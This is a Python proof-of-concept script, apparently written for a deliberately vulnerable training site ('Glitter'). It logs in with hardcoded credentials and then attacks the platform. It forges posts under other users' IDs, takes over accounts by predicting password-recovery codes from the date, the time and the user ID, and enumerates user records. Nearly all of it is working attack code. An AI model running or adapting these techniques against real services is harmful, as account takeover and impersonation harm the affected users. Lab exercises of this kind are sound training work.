import requests 
import json
import datetime
import sys

# Consts
BASE_URL = "http://cyber.glitter.org.il"
URLS = {
    "login": f"{BASE_URL}/user",
    "logout": f"{BASE_URL}/user/{{user_id}}",
    "likes": f"{BASE_URL}/likes",
    "user_search": f"{BASE_URL}/entities?searchType=WILDCARD&searchEntry=",
    "pass_req": f"{BASE_URL}/password-recovery-code-request",
    "pass_ver": f"{BASE_URL}/password-recovery-code-verification",
    "post_glit": f"{BASE_URL}/glit?",
    "comment": f"{BASE_URL}/comments"
}

LOGIN_DATA = ("Pablik", "12345678") #My Data
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
}

# Session manager
session = requests.Session()
session.headers.update(HEADERS)

# Utils
def num_to_letters(num):
    return ''.join(chr(int(d) + ord('A')) for d in str(num))

# Authentication
def login():
    res = session.post(URLS["login"], json=LOGIN_DATA, auth=LOGIN_DATA)
    if res.status_code != 200:
        print("Login failed:", res.text)
        sys.exit(1)
    info = res.json()
    sparkle = info.get("sparkle")
    if not sparkle:
        print("Login failed: sparkle token missing")
        sys.exit(1)
    session.headers.update({"Cookie": f"sparkle={sparkle}"})
    return info

def logout(user_id: int):
    session.delete(URLS["logout"].format(user_id=user_id), auth=LOGIN_DATA)

# Core Features
def post_glit(body, post_as_id=1, post_in_id=53076, bg_color="White", font_color="Black", when=None):
    """
    Post a glit (message) to the Glitter platform.
    Args:
        body (str): The content of the glit.
        post_as_id (int): The user ID to post as.
        post_in_id (int): The feed owner ID to post in.
        bg_color (str): Background color for the glit.
        font_color (str): Font color for the glit.
        when (str, optional): Timestamp for the glit. Defaults to current time.
    Returns:
        None
    """
    info = login()
    glit_data = {
        "id": -1,
        "feed_owner_id": post_in_id,
        "publisher_id": post_as_id,
        "publisher_screen_name": "",
        "publisher_avatar": "im1",
        "background_color": bg_color,
        "date": when or datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "content": body,
        "font_color": font_color
    }

    res = session.post(BASE_URL + "/glit", json=glit_data)
    print("Post Glit:", res.status_code, res.text)

    logout(info["user"]["id"])

def get_user_id(username):
    """
    Fetch the user ID for a given username.
    Args:
        username (str): The username to search for.
    Returns:
        int: The user ID if found, otherwise exits with an error.
    """
    info = login()
    res = session.get(URLS["user_search"] + username)
    users = res.json()
    if not users:
        print("Error: Username not found.")
        sys.exit(1)
    logout(info["user"]["id"])
    return users[0]["id"]

def get_password(username):
    """
    Request a password recovery code and verify it to recover the password.
    Args:
        username (str): The username to recover the password for.
    Returns:
        str: The recovered password or an error message.
    """
    session.post(URLS["pass_req"], json=username)

    date = datetime.datetime.now().strftime("%d%m")
    user_id = get_user_id(username)
    id_str = num_to_letters(user_id)
    time = datetime.datetime.now().strftime("%H%M")

    code = date + id_str + time
    if len(code) != 12:
        print("Warning: Generated code is not 12 characters:", code)

    res = session.post(URLS["pass_ver"], json=[username, code])
    return res.text

def get_user_by_id(user_id):
    """
    Fetch user details by user ID.
    Args:
        user_id (int): The ID of the user to fetch.
    Returns:    
        dict: User details if found, None otherwise.
    """
    login_info = login()
    if not login_info:
        return None

    sparkle_cookie = login_info["sparkle"]
    headers = {
        "Cookie": f"sparkle={sparkle_cookie}",
        "Accept": "application/json"
    }

    url = f"http://cyber.glitter.org.il/entities?searchType=ID&searchEntry={user_id}"
    res = requests.get(url, headers=headers)

    if res.status_code != 200:
        print(f"[ERROR] Status {res.status_code} when getting user {user_id}")
        print("Response:", res.text)
        return None

    try:
        data = res.json()
        if not data:
            print("[INFO] No user found.")
            return None
        return data[0]
    except json.JSONDecodeError:
        print("[ERROR] Response not in JSON format")
        print("Raw response:", res.text)
        return None

# Main usage demo
if __name__ == "__main__":
    post_glit("Hello from improved POC!")
    print("Recovered password:", get_password("Cool_cat"))
    print(get_user_id("test1"))
    print(get_user_by_id(1))


